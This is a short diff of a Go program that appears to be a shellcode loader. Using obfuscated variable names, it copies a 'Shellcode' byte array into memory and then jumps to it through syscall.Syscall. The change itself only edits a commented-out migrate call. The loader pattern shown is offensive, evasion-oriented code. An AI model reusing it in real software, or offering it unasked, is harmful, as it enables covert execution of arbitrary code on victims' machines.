@@ -66,7 +66,7 @@ func main() {
 	for BpuAKrJxfl, IIngacMaBh := range Shellcode {
 		AddrPtr[BpuAKrJxfl+5] = IIngacMaBh
 	}
-	//RSE.Migrate(Addr, Length_int)
+	//RSE.Migrate(Addr, int(Length_int))
 	syscall.Syscall(Addr, 0, 0, 0, 0)
 }
 
